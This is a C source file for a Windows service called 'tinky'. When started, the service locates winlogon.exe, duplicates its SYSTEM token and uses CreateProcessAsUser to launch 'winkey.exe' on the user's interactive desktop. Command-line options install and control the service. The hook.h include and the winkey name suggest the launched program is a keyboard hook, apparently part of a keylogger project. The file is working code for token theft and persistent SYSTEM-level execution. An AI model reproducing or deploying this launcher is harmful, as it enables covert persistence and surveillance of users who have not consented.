
#include "service.h"
#include "hook.h"
#include "logger.h"
#include <tlhelp32.h>

SERVICE_STATUS_HANDLE g_status_handle = NULL;
SERVICE_STATUS        g_status = {0};
STARTUPINFO g_StartupInfo;
PROCESS_INFORMATION g_ProcessInformation;
HANDLE g_hStopEvent = NULL;

HANDLE FindProcessByName(const char *process_name)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hProcess = NULL;
	if (Process32First(hSnapshot, &pe32))
	{
		do
		{
			if (_stricmp(pe32.szExeFile, process_name) == 0)
			{
				hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
				break;
			}
		} while (Process32Next(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	return hProcess;
}

void WINAPI ServiceCtrlHandler(DWORD request)
{
	if (request == SERVICE_CONTROL_STOP || request == SERVICE_CONTROL_SHUTDOWN)
	{
		g_status.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus(g_status_handle, &g_status);

		if (g_hStopEvent)
			SetEvent(g_hStopEvent);
	}
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
	(void)argc;
	(void)argv;

	g_status_handle = RegisterServiceCtrlHandler("tinky", ServiceCtrlHandler);
	if (!g_status_handle)
		return;

	g_hStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

	g_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	g_status.dwCurrentState = SERVICE_START_PENDING;
	g_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	g_status.dwWin32ExitCode = NO_ERROR;
	SetServiceStatus(g_status_handle, &g_status);

	HANDLE hWinProcess = FindProcessByName("winlogon.exe");
	if (!hWinProcess)
	{
		g_status.dwCurrentState = SERVICE_STOPPED;
		g_status.dwWin32ExitCode = GetLastError();
		SetServiceStatus(g_status_handle, &g_status);
		return;
	}

	HANDLE token = NULL;
	if (!OpenProcessToken(hWinProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &token))
	{
		CloseHandle(hWinProcess);
		g_status.dwCurrentState = SERVICE_STOPPED;
		g_status.dwWin32ExitCode = GetLastError();
		SetServiceStatus(g_status_handle, &g_status);
		return;
	}

	HANDLE DupToken = NULL;
	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &DupToken))
	{
		CloseHandle(token);
		CloseHandle(hWinProcess);
		g_status.dwCurrentState = SERVICE_STOPPED;
		g_status.dwWin32ExitCode = GetLastError();
		SetServiceStatus(g_status_handle, &g_status);
		return;
	}

	ZeroMemory(&g_StartupInfo, sizeof(g_StartupInfo));
	g_StartupInfo.cb = sizeof(STARTUPINFO);
	g_StartupInfo.lpDesktop = "winsta0\\default"; 

	ZeroMemory(&g_ProcessInformation, sizeof(g_ProcessInformation));

	char commandLine[] = "winkey.exe";

	if (!CreateProcessAsUser(
			DupToken,
			NULL,
			commandLine,
			NULL,
			NULL,
			FALSE,
			CREATE_NEW_CONSOLE,
			NULL,
			NULL,
			&g_StartupInfo,
			&g_ProcessInformation))
	{
		CloseHandle(DupToken);
		CloseHandle(token);
		CloseHandle(hWinProcess);
		g_status.dwCurrentState = SERVICE_STOPPED;
		g_status.dwWin32ExitCode = GetLastError();
		SetServiceStatus(g_status_handle, &g_status);
		return;
	}

	g_status.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(g_status_handle, &g_status);

	HANDLE waitHandles[2] = { g_hStopEvent, g_ProcessInformation.hProcess };
	DWORD waitResult = WaitForMultipleObjects(2, waitHandles, FALSE, INFINITE);

	if (waitResult == WAIT_OBJECT_0)
	{
		TerminateProcess(g_ProcessInformation.hProcess, 0);
	}

	CloseHandle(g_ProcessInformation.hProcess);
	CloseHandle(g_ProcessInformation.hThread);
	CloseHandle(DupToken);
	CloseHandle(token);
	CloseHandle(hWinProcess);
	CloseHandle(g_hStopEvent);

	g_status.dwCurrentState = SERVICE_STOPPED;
	SetServiceStatus(g_status_handle, &g_status);
}


int main(int argc, char *argv[])
{
	if (argc < 2)
	{
		SERVICE_TABLE_ENTRY dispatchTable[] = {
			{ "tinky", (LPSERVICE_MAIN_FUNCTION)ServiceMain },
			{ NULL, NULL }
		};
		printf("winkey started\n");
		StartServiceCtrlDispatcher(dispatchTable);
		return 0;
	}

	if (strcmp(argv[1], "install") == 0)
		return install_service();
	if (strcmp(argv[1], "delete") == 0)
		return delete_service();
	if (strcmp(argv[1], "start") == 0)
		return start_service();
	if (strcmp(argv[1], "stop") == 0)
		return stop_service();

	printf("Comando desconhecido: %s\n", argv[1]);
	return 1;
}




